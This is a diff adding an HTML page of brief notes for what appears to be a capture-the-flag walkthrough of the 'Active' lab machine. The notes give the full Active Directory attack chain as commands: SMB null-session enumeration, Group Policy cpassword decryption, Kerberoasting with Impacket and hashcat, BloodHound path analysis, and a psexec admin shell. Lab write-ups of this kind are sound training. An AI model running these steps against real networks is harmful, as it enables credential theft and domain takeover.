@@ -1,0 +1,52 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Active - DNS SMB AD BloodHound Kerberoast</title>
+</head><body>Fingerprinting through Microsoft DNS versions (nmap identifies OS version fine)<br/>
+<br/>
+nslookup using the nameserver of the box with DNS tcp open<br/>
+dnsrecon brute range<br/>
+dnsrecon -d &lt;RHOST&gt; -r 10.0.0.0/8<br/>
+<br/>
+smbclient -L //&lt;RHOST&gt;<br/>
+press "enter" for null auth and share listings<br/>
+<br/>
+enum4linux is 'out of date' so ipp likes to use <a href="https://github.com/ShawnDEvans/smbmap">smbmap</a>&nbsp;instead<br/>
+smbmap -H &lt;RHOST&gt; and get permissions of shares<br/>
+smbclient //&lt;RHOST&gt;/&lt;SHARE&gt; and now get a prompt<br/>
+<br/>
+Groups.xml file with a reversable password for a local account<br/>
+Kali built-in:<br/>
+gpp-decrypt &lt;cpassword&gt;<br/>
+<br/>
+smbclient get all files recursively<br/>
+smb: \&gt; recurse ON<br/>
+smb: \&gt; prompt OFF<br/>
+smb: \&gt; mget *<br/>
+<br/>
+Impacket: GetADUsers.py<br/>
+GetADUsers.py -all &nbsp;domain\user -dc-ip &lt;RHOST&gt;<br/>
+<br/>
+You can start a cmd prompt as a user (that doesn't exist on your machine) using:<br/>
+runas /netonly domain\user<br/>
+it will prompt for a password and then use windows authentication 'magic' to perform all operations as that user in that session (save creds in cmd prompt essentially). It makes working with remote users easier. <br/>
+<br/>
+Running sharphound.exe to injest data from Active.htb and analyze<br/>
+Bloodhoud common queries:<br/>
+&nbsp;&#09;Shortest path from kerberoastable users shows Admin is kerberoastable<br/>
+<br/>
+Impacket GetUserSPNs.py <br/>
+GetUserSPNs.py -request -dc-ip &lt;RHOST&gt; domain\user<br/>
+<br/>
+Hashcat crack the output -m 13100<br/>
+<br/>
+Now get a session with psexec as admin<br/>
+psexec.py domain\user@&lt;RHOST&gt;<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
